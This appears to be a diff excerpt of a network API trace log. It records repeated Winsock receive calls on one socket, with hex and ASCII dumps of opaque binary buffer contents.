+<dump_line offset="&#x24;0080" dump="33 46 45 2B 3D 36 86 13 4E 9D 3F 7C C2 E5 1C A8 " ascii="3FE&#x2B;=6..N.&#x3F;&#x7C;...."/>
+<dump_line offset="&#x24;0090" dump="48 43 24 D5 7A E1 66 7C 67 FF B4 9E DA D9 1C 72 " ascii="HC&#x24;.z.f&#x7C;g......r"/>
+<dump_line offset="&#x24;00A0" dump="A7 E6 D7 31 1F 0B C4 6E DC 4B 1E 0F 40 B4 A7 C9 " ascii="...1...n.K..&#x40;..."/>
+<dump_line offset="&#x24;00B0" dump="04 FD 83 31 D9 62 A8 BA 1D BE 9A 03 D1 A4 1B 44 " ascii="...1.b.........D"/>
+<dump_line offset="&#x24;00C0" dump="A6 E8 0A 61 5D 25 B3 1B 1B E4 EB 49 FF DE 41 94 " ascii="...a]&#x25;.....I..A."/>
+<dump_line offset="&#x24;00D0" dump="C4 5B 3D 90 A4 9F B7 82 4F 3F A7 C2 09 D0 76 6A " ascii=".[=.....O&#x3F;....vj"/>
+<dump_line offset="&#x24;00E0" dump="12 98 27 AA 89 3B B3 07 2F A6 67 56 A2 3F 1D BA " ascii="..&#x27;..;../.gV.&#x3F;.."/>
+<dump_line offset="&#x24;00F0" dump="C8 F9 71 A7 42 35 90 4E 88 5F FB 15 6B B1 D6 31 " ascii="..q.B5.N._..k..1"/>
+<trimmed_bytes count="128"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="16392" successful="1">
+<dump_line offset="&#x24;0000" dump="43 AB 59 9D F6 24 C0 B9 26 D0 5F 69 2E EC 0E 2A " ascii="C.Y..&#x24;..&#x26;._i...&#x2A;"/>
+<dump_line offset="&#x24;0010" dump="A9 F8 38 1E E0 E7 43 FC 66 8D 03 83 39 98 D0 4A " ascii="..8...C.f...9..J"/>
+<dump_line offset="&#x24;0020" dump="61 B4 29 89 A9 44 93 18 44 22 6F C6 A6 7F F8 1C " ascii="a.&#x29;..D..D&#x22;o..&#x7F;.."/>
+<dump_line offset="&#x24;0030" dump="E5 B6 7E 51 B9 49 B5 7E 03 28 91 ED 27 55 66 D4 " ascii="..&#x7E;Q.I.&#x7E;.&#x28;..&#x27;Uf."/>
+<dump_line offset="&#x24;0040" dump="CC F0 75 C7 2E A1 CF 5D ED D3 E4 20 B9 E8 9A 75 " ascii="..u....]... ...u"/>
+<dump_line offset="&#x24;0050" dump="97 B6 19 C5 00 29 D8 A3 0C FC 7C F8 6F 67 0C 53 " ascii=".....&#x29;....&#x7C;.og.S"/>
+<dump_line offset="&#x24;0060" dump="31 53 73 80 03 07 F3 2B 00 D1 17 64 32 3C F9 70 " ascii="1Ss....&#x2B;...d2&#x3C;.p"/>
+<dump_line offset="&#x24;0070" dump="E1 9A 6F BA CA CE F7 54 35 B1 EC 00 19 3B EB 19 " ascii="..o....T5....;.."/>
+<dump_line offset="&#x24;0080" dump="A5 AF BF 1F 2D 85 53 41 AD 74 15 96 59 76 66 F3 " ascii="....-.SA.t..Yvf."/>
+<dump_line offset="&#x24;0090" dump="B4 EB 09 8D BA 23 41 2F 44 11 99 05 CA CE 55 FA " ascii=".....&#x23;A/D.....U."/>
+<dump_line offset="&#x24;00A0" dump="67 D4 76 2D 81 7D DF 98 13 E1 D3 95 BE 8A 38 84 " ascii="g.v-.&#x7D;........8."/>
+<dump_line offset="&#x24;00B0" dump="92 AB 75 83 00 24 F7 B5 6A 62 81 CF 72 EB 6F CF " ascii="..u..&#x24;..jb..r.o."/>
+<dump_line offset="&#x24;00C0" dump="3D 51 21 EF D3 FD EB 43 A4 6E 17 81 7A 9F D6 56 " ascii="=Q!....C.n..z..V"/>
+<dump_line offset="&#x24;00D0" dump="97 A2 F3 D7 3C 73 27 AC 96 B9 EA 41 2F BE 26 D9 " ascii="....&#x3C;s&#x27;....A/.&#x26;."/>
+<dump_line offset="&#x24;00E0" dump="99 A9 AF 6A A4 9D 1F E4 EC 1F 03 09 A2 DB 54 A3 " ascii="...j..........T."/>
+<dump_line offset="&#x24;00F0" dump="A9 F4 EE 60 23 54 EC BE CE EE E2 D5 58 AB 07 B7 " ascii="...&#x60;&#x23;T......X..."/>
+<trimmed_bytes count="16136"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="15472" successful="1">
+<dump_line offset="&#x24;0000" dump="FA 51 3B 7A 26 34 0E 07 87 26 F0 96 35 6E 00 51 " ascii=".Q;z&#x26;4...&#x26;..5n.Q"/>
+<dump_line offset="&#x24;0010" dump="7C 59 4B 55 AC 36 78 72 0C 0D 85 96 1C 80 FC 53 " ascii="&#x7C;YKU.6xr.......S"/>
+<dump_line offset="&#x24;0020" dump="BD 31 83 13 1D E0 C1 01 84 01 37 7B 10 E4 96 A0 " ascii=".1........7&#x7B;...."/>
+<dump_line offset="&#x24;0030" dump="E5 A6 FD 77 9E 13 CE 27 F2 A1 44 6A B0 AA D9 05 " ascii="...w...&#x27;..Dj...."/>
+<dump_line offset="&#x24;0040" dump="8E 7B 01 AD F3 CC C8 2F DB 85 E8 E4 71 43 76 B4 " ascii=".&#x7B;...../....qCv."/>
+<dump_line offset="&#x24;0050" dump="E1 CC 64 27 63 2A 51 E3 FA 03 D7 7E CA CB F2 BD " ascii="..d&#x27;c&#x2A;Q....&#x7E;...."/>
+<dump_line offset="&#x24;0060" dump="DE 23 5C 59 DF EC AB C0 0B D3 AF 41 60 AB C0 70 " ascii=".&#x23;\Y.......A&#x60;..p"/>
+<dump_line offset="&#x24;0070" dump="99 5B 65 1E 45 5B E9 D3 B8 82 49 A2 F2 55 AD 9C " ascii=".[e.E[....I..U.."/>
+<dump_line offset="&#x24;0080" dump="98 81 3A D4 30 94 41 75 2A 15 87 5A AA 42 91 3B " ascii="..:.0.Au&#x2A;..Z.B.;"/>
+<dump_line offset="&#x24;0090" dump="44 49 9B 2F 9D E9 89 C0 AF 0B A5 15 9F A6 59 2B " ascii="DI./..........Y&#x2B;"/>
+<dump_line offset="&#x24;00A0" dump="54 67 9D 54 CE BB AC D9 C0 36 87 E1 7E 0F 8C 72 " ascii="Tg.T.....6..&#x7E;..r"/>
+<dump_line offset="&#x24;00B0" dump="09 43 68 14 AA 76 8B F7 2C AE 56 32 8D 3F 9F 31 " ascii=".Ch..v..,.V2.&#x3F;.1"/>
+<dump_line offset="&#x24;00C0" dump="5C C4 95 0B 50 34 CD C7 5C A9 2E 89 5E 13 38 DB " ascii="\...P4..\...&#x5E;.8."/>
+<dump_line offset="&#x24;00D0" dump="4B 64 A2 A0 99 D8 20 5D D0 3E F8 D3 50 10 7E CE " ascii="Kd.... ].&#x3E;..P.&#x7E;."/>
+<dump_line offset="&#x24;00E0" dump="C9 28 F2 A6 38 0D B1 48 BA EE 3C 44 1C 64 D2 45 " ascii=".&#x28;..8..H..&#x3C;D.d.E"/>
+<dump_line offset="&#x24;00F0" dump="AD A9 50 92 1F 6C 53 37 F1 42 45 E9 50 CD 94 6D " ascii="..P..lS7.BE.P..m"/>
+<trimmed_bytes count="15216"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="14344" successful="1">
+<dump_line offset="&#x24;0000" dump="20 2B 33 CE B9 36 AF 9D 0C 90 21 B0 D8 BF D0 DC " ascii=" &#x2B;3..6....!....."/>
+<dump_line offset="&#x24;0010" dump="AE ED B7 21 A2 25 D5 1B F3 88 04 05 64 51 76 EB " ascii="...!.&#x25;......dQv."/>
+<dump_line offset="&#x24;0020" dump="34 24 35 55 B4 3F A5 A3 3D D9 10 E2 E2 B3 CC E4 " ascii="4&#x24;5U.&#x3F;..=......."/>
+<dump_line offset="&#x24;0030" dump="02 56 94 7A AA 1B 80 6B B7 79 47 A2 36 37 DD 42 " ascii=".V.z...k.yG.67.B"/>
+<dump_line offset="&#x24;0040" dump="D2 91 59 8A 0C 85 3E AE F6 82 D2 07 1C A1 52 DF " ascii="..Y...&#x3E;.......R."/>
+<dump_line offset="&#x24;0050" dump="C5 AB 1F 9C 80 02 12 1B A7 E6 AB 1C FC C8 8D 54 " ascii="...............T"/>
+<dump_line offset="&#x24;0060" dump="23 15 C7 6C 21 D9 E8 E2 3F C3 1A A2 3C A9 93 40 " ascii="&#x23;..l!...&#x3F;...&#x3C;..&#x40;"/>
+<dump_line offset="&#x24;0070" dump="D8 4D DF F9 75 4A 4C 21 EA 10 96 AD 17 1E A7 5C " ascii=".M..uJL!.......\"/>
+<dump_line offset="&#x24;0080" dump="25 07 CA B8 09 8F 47 50 28 A0 36 A5 F7 45 06 A2 " ascii="&#x25;.....GP&#x28;.6..E.."/>
+<dump_line offset="&#x24;0090" dump="CA F2 9D 29 E8 91 C3 31 77 4B 2D 20 1C 43 A3 24 " ascii="...&#x29;...1wK- .C.&#x24;"/>
+<dump_line offset="&#x24;00A0" dump="1E 5A D4 80 33 E1 7E 29 3D C8 02 80 C3 00 1B D4 " ascii=".Z..3.&#x7E;&#x29;=......."/>
+<dump_line offset="&#x24;00B0" dump="9E 14 3D EC CA 35 21 5F B4 44 06 A9 30 86 94 EF " ascii="..=..5!_.D..0..."/>
+<dump_line offset="&#x24;00C0" dump="A3 EA 78 68 0B C2 20 70 00 FE FA 80 7B B9 6F 06 " ascii="..xh.. p....&#x7B;.o."/>
+<dump_line offset="&#x24;00D0" dump="89 38 E9 29 E0 0A 44 F6 A6 60 F5 8A E7 36 24 67 " ascii=".8.&#x29;..D..&#x60;...6&#x24;g"/>
+<dump_line offset="&#x24;00E0" dump="DF 71 3E F4 0B 54 E7 54 6C 32 68 AA 34 F6 66 AF " ascii=".q&#x3E;..T.Tl2h.4.f."/>
+<dump_line offset="&#x24;00F0" dump="F1 4C 7C 19 D9 23 03 E2 C9 9F B8 30 51 DA E9 6B " ascii=".L&#x7C;..&#x23;.....0Q..k"/>
+<trimmed_bytes count="14088"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="3468" successful="1">
+<dump_line offset="&#x24;0000" dump="DF B0 8B 22 6E C2 06 83 C5 CE DB 7A 41 36 C8 EC " ascii="...&#x22;n......zA6.."/>
+<dump_line offset="&#x24;0010" dump="BF 9C C6 67 80 5E A3 AF 66 ED 0E 94 F8 95 DE C5 " ascii="...g.&#x5E;..f......."/>
+<dump_line offset="&#x24;0020" dump="E5 DF A8 03 82 FA 4D D5 51 1E 0C 26 42 BA 9B 8F " ascii="......M.Q..&#x26;B..."/>
+<dump_line offset="&#x24;0030" dump="AD AD A8 87 69 C5 19 6F A8 6F D0 6A 4A 7E A7 BB " ascii="....i..o.o.jJ&#x7E;.."/>
+<dump_line offset="&#x24;0040" dump="8E CE BC 90 36 DB CD BF 08 4C 52 D2 19 4E 37 31 " ascii="....6....LR..N71"/>
+<dump_line offset="&#x24;0050" dump="F5 38 5F 40 CD E4 C6 DF 8A B1 00 2D DC F6 79 65 " ascii=".8_&#x40;.......-..ye"/>
+<dump_line offset="&#x24;0060" dump="37 D7 89 32 01 C7 D8 34 36 34 FD 21 1E EC B5 20 " ascii="7..2...464.!... "/>
+<dump_line offset="&#x24;0070" dump="C3 B9 EA 0F 16 B9 25 40 D2 3D C4 64 9B E9 9B A8 " ascii="......&#x25;&#x40;.=.d...."/>
+<dump_line offset="&#x24;0080" dump="CF 9A BB D5 D4 51 FF 41 8D B2 03 59 A8 A8 A6 DD " ascii=".....Q.A...Y...."/>
+<dump_line offset="&#x24;0090" dump="AE 2E EE D6 4C B9 BF 56 F2 42 56 27 DD 46 74 E0 " ascii="....L..V.BV&#x27;.Ft."/>
+<dump_line offset="&#x24;00A0" dump="32 89 24 6C FD C6 DC DF DE 56 91 E0 5A 57 B2 FE " ascii="2.&#x24;l.....V..ZW.."/>
+<dump_line offset="&#x24;00B0" dump="6C 35 94 25 79 8C 9B D5 33 7A F9 43 96 7F 50 A6 " ascii="l5.&#x25;y...3z.C.&#x7F;P."/>
+<dump_line offset="&#x24;00C0" dump="4F C7 84 5A E2 2D D4 21 F8 4B B5 1F C8 5A F3 C2 " ascii="O..Z.-.!.K...Z.."/>
+<dump_line offset="&#x24;00D0" dump="94 A0 13 DA B4 FE BA AD B5 EE 31 CB B8 3E 89 77 " ascii="..........1..&#x3E;.w"/>
+<dump_line offset="&#x24;00E0" dump="EC 29 AB 5F A9 F3 E8 7E 51 A7 A7 91 92 D8 FC 24 " ascii=".&#x29;._...&#x7E;Q......&#x24;"/>
+<dump_line offset="&#x24;00F0" dump="F5 74 BD CD C8 1E FE C2 F2 10 D8 16 0B EA E5 C1 " ascii=".t.............."/>
+<trimmed_bytes count="3212"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="13624" successful="1">
+<dump_line offset="&#x24;0000" dump="09 57 63 EF 59 0D 05 CF 53 24 9E 84 82 76 C8 1C " ascii=".Wc.Y...S&#x24;...v.."/>
+<dump_line offset="&#x24;0010" dump="4A 52 43 A5 0F B6 45 DF B4 56 00 ED 9C 6A 7C 05 " ascii="JRC...E..V...j&#x7C;."/>
+<dump_line offset="&#x24;0020" dump="D0 D4 9E 67 80 54 77 F8 E9 55 AE 8D 3C C1 DA BA " ascii="...g.Tw..U..&#x3C;..."/>
+<dump_line offset="&#x24;0030" dump="BE F2 D2 E6 00 11 26 90 81 CB 70 0F B5 B1 DA 77 " ascii="......&#x26;...p....w"/>
+<dump_line offset="&#x24;0040" dump="9D F9 14 2B 8F 3E B8 79 D0 A7 12 C1 A4 83 4F B4 " ascii="...&#x2B;.&#x3E;.y......O."/>
+<dump_line offset="&#x24;0050" dump="BE D7 00 34 28 F4 36 D2 FB 79 B8 57 4E 50 06 EC " ascii="...4&#x28;.6..y.WNP.."/>
+<dump_line offset="&#x24;0060" dump="D4 79 7D FC 60 DE C8 8A 55 A1 55 51 8C E1 BD 6D " ascii=".y&#x7D;.&#x60;...U.UQ...m"/>
+<dump_line offset="&#x24;0070" dump="09 38 3A BA 6F 2D 35 33 75 47 B7 E5 C3 5F 5B 1F " ascii=".8:.o-53uG..._[."/>
+<dump_line offset="&#x24;0080" dump="B0 EB CC FA A1 C8 EA 36 00 BE 15 BC D3 3F 84 68 " ascii=".......6.....&#x3F;.h"/>
+<dump_line offset="&#x24;0090" dump="E5 08 B3 D9 07 DB 0D B4 32 2A 73 1C F3 82 4E B4 " ascii="........2&#x2A;s...N."/>
+<dump_line offset="&#x24;00A0" dump="2B AC AD 08 65 1B B1 59 A0 A0 11 F0 AE F5 50 93 " ascii="&#x2B;...e..Y......P."/>
+<dump_line offset="&#x24;00B0" dump="C8 E7 9E 75 4D 0D 24 BE 0B F9 1D 0E 07 02 88 B2 " ascii="...uM.&#x24;........."/>
+<dump_line offset="&#x24;00C0" dump="23 F9 CE 60 A5 92 AC 42 0E 00 F0 81 4D 0B 27 95 " ascii="&#x23;..&#x60;...B....M.&#x27;."/>
+<dump_line offset="&#x24;00D0" dump="83 F5 2C 18 56 A0 50 FB F2 05 94 A6 8D 61 D9 85 " ascii="..,.V.P......a.."/>
+<dump_line offset="&#x24;00E0" dump="AE 84 A3 98 A3 64 F4 BF 25 55 8B 9B 43 28 0F D1 " ascii=".....d..&#x25;U..C&#x28;.."/>
+<dump_line offset="&#x24;00F0" dump="56 67 FB C7 26 C3 8E DB 19 F5 83 10 B1 B1 5A 76 " ascii="Vg..&#x26;.........Zv"/>
+<trimmed_bytes count="13368"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="7044" successful="1">
+<dump_line offset="&#x24;0000" dump="20 12 9B 63 E0 E2 AF 48 AD 90 C8 DB 44 63 49 6B " ascii=" ..c...H....DcIk"/>
+<dump_line offset="&#x24;0010" dump="EB F3 98 50 21 E2 96 17 14 7F 96 5E 85 9B DC 55 " ascii="...P!....&#x7F;.&#x5E;...U"/>
+<dump_line offset="&#x24;0020" dump="13 84 A8 5E 45 F8 4D BA 01 66 98 7A 73 87 56 CF " ascii="...&#x5E;E.M..f.zs.V."/>
+<dump_line offset="&#x24;0030" dump="46 37 73 A4 35 2B 0F D4 F3 9B C2 9B 48 F0 3A 75 " ascii="F7s.5&#x2B;......H.:u"/>
+<dump_line offset="&#x24;0040" dump="36 D5 5A 0B 33 D0 92 4B 94 B4 77 0F 40 BC FC 16 " ascii="6.Z.3..K..w.&#x40;..."/>
+<dump_line offset="&#x24;0050" dump="0E B8 6F 28 59 CA B6 F6 D0 52 E8 59 DE A6 95 25 " ascii="..o&#x28;Y....R.Y...&#x25;"/>
+<dump_line offset="&#x24;0060" dump="C0 E3 1B ED A5 FC EE E4 02 BE B2 04 D7 96 FA 7A " ascii="...............z"/>
+<dump_line offset="&#x24;0070" dump="62 1C 49 8B 71 4F 4A 96 64 27 73 18 B5 CD C5 82 " ascii="b.I.qOJ.d&#x27;s....."/>
+<dump_line offset="&#x24;0080" dump="CB 5B AB 47 32 A7 10 29 36 93 24 1E BD 28 3C 6E " ascii=".[.G2..&#x29;6.&#x24;..&#x28;&#x3C;n"/>
+<dump_line offset="&#x24;0090" dump="E8 92 3C 00 C2 DE 6B F1 85 56 34 86 11 6C C5 14 " ascii="..&#x3C;...k..V4..l.."/>
+<dump_line offset="&#x24;00A0" dump="1C 17 BB F2 98 B3 2F CA 15 00 4D 5E BA 66 0E FA " ascii="....../...M&#x5E;.f.."/>
+<dump_line offset="&#x24;00B0" dump="C2 D0 9F 5E C0 A4 E0 22 C8 E4 40 F3 55 2E 8E 6C " ascii="...&#x5E;...&#x22;..&#x40;.U..l"/>
+<dump_line offset="&#x24;00C0" dump="19 55 1B 4E 9C AB 45 7F 58 C8 9F A3 4A BE E3 9D " ascii=".U.N..E&#x7F;X...J..."/>
+<dump_line offset="&#x24;00D0" dump="7F F1 26 9F 0F F4 22 F7 AB 4F D6 36 63 74 5C 86 " ascii="&#x7F;.&#x26;...&#x22;..O.6ct\."/>
+<dump_line offset="&#x24;00E0" dump="A6 36 77 10 4C 3A 3D 14 7F 85 C5 BE 21 61 1E 95 " ascii=".6w.L:=.&#x7F;...!a.."/>
+<dump_line offset="&#x24;00F0" dump="8C 25 68 89 1B A2 A0 E0 E5 75 12 A2 EA F2 F6 E0 " ascii=".&#x25;h......u......"/>
+<trimmed_bytes count="6788"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="9732" successful="1">
+<dump_line offset="&#x24;0000" dump="ED 29 01 F8 F3 1A 4E 98 E9 A4 AB D2 D9 AB 34 99 " ascii=".&#x29;....N.......4."/>
+<dump_line offset="&#x24;0010" dump="0C 89 40 A6 28 B3 36 F2 84 82 D3 30 18 9A 27 AA " ascii="..&#x40;.&#x28;.6....0..&#x27;."/>
+<dump_line offset="&#x24;0020" dump="CB CF 0B 73 8C 8B 47 E0 93 13 DB 2D 30 A6 7C 0A " ascii="...s..G....-0.&#x7C;."/>
+<dump_line offset="&#x24;0030" dump="14 E4 FF ED 6F B7 A8 D1 BB DD 61 22 DA 03 06 B9 " ascii="....o.....a&#x22;...."/>
+<dump_line offset="&#x24;0040" dump="34 AD 70 03 35 21 E3 95 04 63 A7 5A 66 15 42 CD " ascii="4.p.5!...c.Zf.B."/>
+<dump_line offset="&#x24;0050" dump="09 07 B1 4C 73 85 13 60 D8 88 B1 0A F9 E0 68 0C " ascii="...Ls..&#x60;......h."/>
+<dump_line offset="&#x24;0060" dump="E2 DD 25 5C 72 3E D6 4F 5D 85 E0 D1 6F E7 E5 3D " ascii="..&#x25;\r&#x3E;.O]...o..="/>
+<dump_line offset="&#x24;0070" dump="58 CA 99 40 4B 1F EA 41 96 1C 73 A8 B9 F5 B1 27 " ascii="X..&#x40;K..A..s....&#x27;"/>
+<dump_line offset="&#x24;0080" dump="8C AD D2 59 A8 EB 5F 59 32 F6 11 F5 B0 20 A6 1D " ascii="...Y.._Y2.... .."/>
+<dump_line offset="&#x24;0090" dump="83 9C 52 DB CA 22 31 69 B9 7C 64 83 BA 3C 16 6D " ascii="..R..&#x22;1i.&#x7C;d..&#x3C;.m"/>
+<dump_line offset="&#x24;00A0" dump="4F 24 70 6B 36 41 2D D8 38 4E F8 5B B4 30 1C 17 " ascii="O&#x24;pk6A-.8N.[.0.."/>
+<dump_line offset="&#x24;00B0" dump="F4 B9 1E 03 4A B5 E4 E1 A2 1D 51 E4 1B 07 04 15 " ascii="....J.....Q....."/>
+<dump_line offset="&#x24;00C0" dump="3D 93 F6 A6 BC 2A 8A 6C 76 61 EE 4F 6F 9B A3 43 " ascii="=....&#x2A;.lva.Oo..C"/>
+<dump_line offset="&#x24;00D0" dump="AD 66 6F FD D2 6D BB D9 9C 80 87 0C A6 54 47 29 " ascii=".fo..m.......TG&#x29;"/>
+<dump_line offset="&#x24;00E0" dump="83 2E 7B 5A 9F 11 23 CD FE 63 CD D0 6B 55 C1 E7 " ascii="..&#x7B;Z..&#x23;..c..kU.."/>
+<dump_line offset="&#x24;00F0" dump="87 FB 07 28 68 B3 EF 89 C9 9E B0 F9 06 99 E7 9A " ascii="...&#x28;h..........."/>
+<trimmed_bytes count="9476"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="13140" successful="1">
+<dump_line offset="&#x24;0000" dump="0D 0A 33 66 66 38 0D 0A CF 9F 0B 7D EB DC C5 32 " ascii="..3ff8.....&#x7D;...2"/>
+<dump_line offset="&#x24;0010" dump="EC 70 FC 2A EE 55 DD A3 BE C0 F1 07 45 81 B9 53 " ascii=".p.&#x2A;.U......E..S"/>
+<dump_line offset="&#x24;0020" dump="6D F4 2F C6 84 C1 ED 25 15 00 26 AA EB 8A 49 EC " ascii="m./....&#x25;..&#x26;...I."/>
+<dump_line offset="&#x24;0030" dump="EF BC 6F 8C 8A 65 DE 08 3C AE 7D BE E1 48 CE 69 " ascii="..o..e..&#x3C;.&#x7D;..H.i"/>
+<dump_line offset="&#x24;0040" dump="52 EB 46 23 14 D2 A3 95 F2 62 61 32 C8 A9 27 40 " ascii="R.F&#x23;.....ba2..&#x27;&#x40;"/>
+<dump_line offset="&#x24;0050" dump="5A 07 DC 39 7C F0 61 14 70 D3 41 31 6C 8A 5A 2C " ascii="Z..9&#x7C;.a.p.A1l.Z,"/>
+<dump_line offset="&#x24;0060" dump="2D 1C 2B 11 10 A1 D3 54 58 D7 BB 96 CC 83 21 14 " ascii="-.&#x2B;....TX.....!."/>
+<dump_line offset="&#x24;0070" dump="34 7B C8 B6 BD 78 C1 3A CD 17 9E 58 8F AA 7B 14 " ascii="4&#x7B;...x.:...X..&#x7B;."/>
+<dump_line offset="&#x24;0080" dump="E4 F1 71 35 BD 0A 42 8F D9 82 40 27 1A 9E EE ED " ascii="..q5..B...&#x40;&#x27;...."/>
+<dump_line offset="&#x24;0090" dump="CB 37 F4 48 BC 8E 7F 10 4B C4 3A 16 62 2A F7 90 " ascii=".7.H..&#x7F;.K.:.b&#x2A;.."/>
+<dump_line offset="&#x24;00A0" dump="70 71 A6 F9 83 F0 5C 53 38 2C F6 BA BE 5A BD 6E " ascii="pq....\S8,...Z.n"/>
+<dump_line offset="&#x24;00B0" dump="D8 73 AD 48 2C 7E 6B FB C1 5E 32 E4 66 3C 25 33 " ascii=".s.H,&#x7E;k..&#x5E;2.f&#x3C;&#x25;3"/>
+<dump_line offset="&#x24;00C0" dump="A9 C6 01 61 56 77 D2 40 95 78 21 F4 48 44 47 83 " ascii="...aVw.&#x40;.x!.HDG."/>
+<dump_line offset="&#x24;00D0" dump="3C 1E FC F7 19 97 DF 00 6B 3D DE 15 F1 DB 5B 8E " ascii="&#x3C;.......k=....[."/>
+<dump_line offset="&#x24;00E0" dump="44 84 BB E1 F2 57 34 4F 8C F2 AE 9B 76 86 8D 72 " ascii="D....W4O....v..r"/>
+<dump_line offset="&#x24;00F0" dump="B0 AF 5F 92 36 09 FD E7 87 3F AB F2 22 9E C3 1C " ascii=".._.6....&#x3F;..&#x22;..."/>
+<trimmed_bytes count="12884"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="14336" successful="1">
+<dump_line offset="&#x24;0000" dump="8D 2E 68 0D 6C 40 01 2F 91 B6 63 F3 3B 73 94 D8 " ascii="..h.l&#x40;./..c.;s.."/>
+<dump_line offset="&#x24;0010" dump="58 E7 8A C3 D2 07 39 94 98 E6 F4 31 CD 84 F1 AD " ascii="X.....9....1...."/>
+<dump_line offset="&#x24;0020" dump="FC A6 C0 26 E6 9A 93 7F A2 EB 93 ED 68 05 53 BE " ascii="...&#x26;...&#x7F;....h.S."/>
+<dump_line offset="&#x24;0030" dump="3A 52 A2 DA A6 40 69 43 E7 1C 36 F6 8A 14 EC 1C " ascii=":R...&#x40;iC..6....."/>
+<dump_line offset="&#x24;0040" dump="98 EC DC DC 40 F8 BF BE F7 87 95 3F FE A6 28 9E " ascii="....&#x40;......&#x3F;..&#x28;."/>
+<dump_line offset="&#x24;0050" dump="F2 10 AD CD 6E 6E 0F EF 63 45 6D C5 BC 06 67 76 " ascii="....nn..cEm...gv"/>
+<dump_line offset="&#x24;0060" dump="11 91 9C F1 01 02 3E FA FD 33 5E 05 5A AA D4 B1 " ascii="......&#x3E;..3&#x5E;.Z..."/>
+<dump_line offset="&#x24;0070" dump="96 D0 CE 34 E8 37 2C 1D 3B 81 49 5D 8F F7 DF 02 " ascii="...4.7,.;.I]...."/>
+<dump_line offset="&#x24;0080" dump="63 7D 32 94 D0 C0 15 BA BB 25 D3 0D C9 49 17 81 " ascii="c&#x7D;2......&#x25;...I.."/>
+<dump_line offset="&#x24;0090" dump="2F BD 31 0F 8C 4F 1B 58 A0 E0 6A 9A 14 97 E1 13 " ascii="/.1..O.X..j....."/>
+<dump_line offset="&#x24;00A0" dump="3D F1 7C 8C F9 C7 5B 47 CD 4E 56 96 80 93 C6 90 " ascii="=.&#x7C;...[G.NV....."/>
+<dump_line offset="&#x24;00B0" dump="AE 68 7F E8 F8 05 45 E2 AA 1B 9E 27 52 A6 71 82 " ascii=".h&#x7F;...E....&#x27;R.q."/>
+<dump_line offset="&#x24;00C0" dump="E0 BB 4E 80 F2 C6 D2 BD 1E 6E A9 52 9B 20 9C CC " ascii="..N......n.R. .."/>
+<dump_line offset="&#x24;00D0" dump="19 57 89 F5 E2 63 2B BF D3 E5 5A D2 73 7C AD 6F " ascii=".W...c&#x2B;...Z.s&#x7C;.o"/>
+<dump_line offset="&#x24;00E0" dump="3F FB FB A6 48 8E CF 6B 6E C4 D9 4B 6F E8 D0 26 " ascii="&#x3F;...H..kn..Ko..&#x26;"/>
+<dump_line offset="&#x24;00F0" dump="A9 7A 29 03 A3 B5 FC 86 C9 A7 AA 8B 7E 66 BD 0D " ascii=".z&#x29;.........&#x7E;f.."/>
+<trimmed_bytes count="14080"/>
+</recv_socket>
+<message>OverlappedWinsockIO_Recv</message>
+<recv_socket socket="1844" buffer_len="13532" successful="1">
+<dump_line offset="&#x24;0000" dump="BB 82 30 29 E1 28 F5 9B A7 70 C1 4D 4B E6 99 BE " ascii="..0&#x29;.&#x28;...p.MK..."/>
+<dump_line offset="&#x24;0010" dump="A6 C2 FE F6 04 5C 63 57 11 79 89 A7 D8 D6 65 2A " ascii=".....\cW.y....e&#x2A;"/>
+<dump_line offset="&#x24;0020" dump="B7 40 27 FF F8 1C E8 A0 50 CD 9F 5F 4C 8F 7C 0F " ascii=".&#x40;&#x27;.....P.._L.&#x7C;."/>
+<dump_line offset="&#x24;0030" dump="CA 4C 28 BA 6E 96 F6 D5 E9 B8 D0 D2 EB CA B0 9D " ascii=".L&#x28;.n..........."/>
+<dump_line offset="&#x24;0040" dump="3F B1 E3 C8 79 D7 24 A8 90 50 9B 10 22 36 EE 0A " ascii="&#x3F;...y.&#x24;..P..&#x22;6.."/>
+<dump_line offset="&#x24;0050" dump="80 79 E4 DD 5B 4F 63 81 E2 AE 89 8C D6 64 CC AC " ascii=".y..[Oc......d.."/>
+<dump_line offset="&#x24;0060" dump="92 AA EB 30 4C 3A 5B 97 61 A4 03 4D FC 6E 3F 88 " ascii="...0L:[.a..M.n&#x3F;."/>
+<dump_line offset="&#x24;0070" dump="5C A2 F5 70 33 9F 5B 96 EB FA 55 5A CA FA 0F BB " ascii="\..p3.[...UZ...."/>
+<dump_line offset="&#x24;0080" dump="0C 23 11 24 7D 26 4F DB 75 14 42 DA 80 53 FC 90 " ascii=".&#x23;.&#x24;&#x7D;&#x26;O.u.B..S.."/>
+<dump_line offset="&#x24;0090" dump="4A 9A D8 EF 34 94 1C B9 16 B4 C7 EA F1 90 21 7D " ascii="J...4.........!&#x7D;"/>
+<dump_line offset="&#x24;00A0" dump="5D 4C C6 74 50 19 78 1E 3D 85 EC 45 AD 74 A3 7A " ascii="]L.tP.x.=..E.t.z"/>
+<dump_line offset="&#x24;00B0" dump="2D 60 95 6A 7B 18 B0 29 E0 18 2C 91 AD F3 4A 13 " ascii="-&#x60;.j&#x7B;..&#x29;..,...J."/>
+<dump_line offset="&#x24;00C0" dump="5B 37 F9 37 D7 34 DA FB 6F D3 EA 89 E8 91 A3 FD " ascii="[7.7.4..o......."/>
+<dump_line offset="&#x24;00D0" dump="B1 42 0F 64 4C E4 B9 CE 56 D5 CE F2 93 2F C2 BF " ascii=".B.dL...V..../.."/>
+<dump_line offset="&#x24;00E0" dump="FE 40 CB 14 A6 FE 7B 0A 8E D1 6D 03 18 46 31 D7 " ascii=".&#x40;....&#x7B;...m..F1."/>
+<dump_line offset="&#x24;00F0" dump="0C 62 3D 32 40 77 EF 6F D9 28 56 38 58 85 13 14 " ascii=".b=2&#x40;w.o.&#x28;V8X..."/>
